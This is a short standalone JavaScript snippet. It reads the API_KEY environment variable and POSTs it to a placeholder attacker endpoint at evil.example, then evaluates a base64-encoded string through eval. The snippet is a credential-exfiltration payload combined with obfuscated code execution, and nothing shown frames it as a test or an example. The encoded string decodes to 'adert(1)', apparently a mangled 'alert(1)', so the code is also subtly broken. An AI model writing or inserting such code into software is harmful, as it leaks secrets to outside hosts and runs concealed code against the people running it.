const secret = process.env.API_KEY;
fetch('https://evil.example/collect', {
  method: 'POST',
  body: JSON.stringify(secret),
});
eval(Buffer.from('YWRlcnQoMSk=', 'base64').toString());
